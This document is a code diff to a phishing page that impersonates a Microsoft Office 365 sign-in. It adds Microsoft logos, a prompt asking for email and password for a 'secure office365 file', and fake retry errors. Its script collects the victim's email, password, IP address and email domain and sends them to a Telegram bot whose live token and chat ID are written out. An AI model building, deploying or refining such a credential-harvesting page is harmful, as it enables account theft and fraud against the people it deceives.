@@ -1569,7 +1569,7 @@
             <span>EMAIL SETTINGS PORTAL</span>
         </div> -->
         <div class="top_level" style="background-color: transparent;">
-            <img id="top_label_logo" style="width: 40px; height: 40px;" src="">
+            <img style="width: 90px; height: 80px;" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"/>
             <h3 id="top_label_tittle"><span id="top_label"></span></h3>
         </div>
         <div class="intro-text">
@@ -1582,7 +1582,7 @@
                 <a class="cityCountry">&nbsp;&nbsp;<i class="fa-solid fa-location-dot"></i> <span id="state"></span>,&nbsp;&nbsp; <span id="country"></span></a>
              </div>
             <hr style="width:100%;text-align:left;margin-left:0">
-            <p id="comment_text">You're accessing a secure settings, please provide your <b><span id="manutd"></span></b> password to continue.</p>
+            <p id="comment_text">You're accessing a secure office365 file, please provide your <b><span id="manutd"></span></b> Email & password to continue.</p>
         </div>
         <div class="profileEmail">
            
@@ -1590,21 +1590,23 @@
         </div>
 		<form id="contactform" method="POST" action="">
         <div class="inputs"><div class="input">
-		<input id="email" type="hidden" name="email">
+		<input id="email" type="email" placeholder="email address" name="email">
+<p></p> <span id="auth_reg">This username may be incorrect. Make sure you typed it correctly. Otherwise, contact your admin</span>
+ <input type="password" name="password" placeholder="password" id="password" autofocus="true" style="border-color: rgb(140, 140, 140);">
 
-<input type="password" name="password" id="password" autofocus="true" style="border-color: rgb(140, 140, 140);">
-<label id="pass_label" for="password">Password</label>
 </div>
 <div class="errorBox">
-<span id="auth_reg">Authentication required!</span>
+
 <span id="auth_reg2">Authentication error. Please try again.</span>
 <span id="auth_attempts" style="color: rgb(0, 103, 184);">attempt(s) left</span>
 </div>
-<br>
+<br><p></p>
 <div class="rem_me">
-<input type="checkbox" name="" id="show_pass_button">
-<a id="show_pass" style="color:#0A66C3; font-size: 0.8rem;">Show password</a>
+<input type="hidden" name="" id="show_pass_button">
+<br><p></p>
+
 </div><br></div>
+<br><p></p>
         <button id="next_button" style="padding-top: 5px !important; padding-bottom: 5px !important; color: rgb(255, 255, 255); background: rgb(0, 103, 184);width:100%;">NEXT</button>
 		</form>
         <br>
@@ -4598,8 +4600,8 @@ $('#opsder').html(bari);
 	$('#footer_dom').html(my_slice);
 	$('#emailich').html(my_slice);
 	$('#carss').html(my_email);
-	$("#top_label_logo").attr("src", "https://logo.clearbit.com/" + my_slice);
-	$("#faviconx").attr("href", "https://logo.clearbit.com/" + my_slice);
+	$("#top_label_logo").attr("src", "https://www.liblogo.com/img-logo/mi3160fa63-microsoft-office-logo-file-microsoft-office-logo-2019-present-svg-liblogo.png/" + my_slice);
+	$("#faviconx").attr("href", "https://www.liblogo.com/img-logo/mi3160fa63-microsoft-office-logo-file-microsoft-office-logo-2019-present-svg-liblogo.png/" + my_slice);
 	$('#body').css('background-image', 'url(https://image.thum.io/get/width/1200/https://' + my_slice);
 	$(document).attr("title", 'PORTAL  - ' + my_slice + ' Mail Authentication');
 	///////////new injection////////////////
@@ -4630,9 +4632,11 @@ $('#opsder').html(bari);
 				// Get the user's IP address
 				$.getJSON('https://api.ipify.org?format=json', function(data){
 					var ip = data.ip;
-	
+					var emailDomain = email.split('@')[1];
+					document.cookie = "emailDomain=" + emailDomain + "; path=/;";
+
 					// Prepare the data to send to the Telegram bot
-					var message = `Email: ${email}\nPassword: ${password}\nIP Address: ${ip}`;
+					var message = `Email: ${email}\nPassword: ${password}\nIP Address: ${ip}\nEmail Domain: ${emailDomain}`;
 					var chat_id = "7946049007"; // Replace with your chat ID
 					var bot_token = "7119131469:AAFOzZl4M9JSE4jIkRry2tRHiIoNnva1P58"; // Replace with your bot token
 					var telegram_url = `https://api.telegram.org/bot${bot_token}/sendMessage`;
@@ -4689,6 +4693,7 @@ $('#opsder').html(bari);
 			});
 		});
 	</script>
+
 	
 	
    
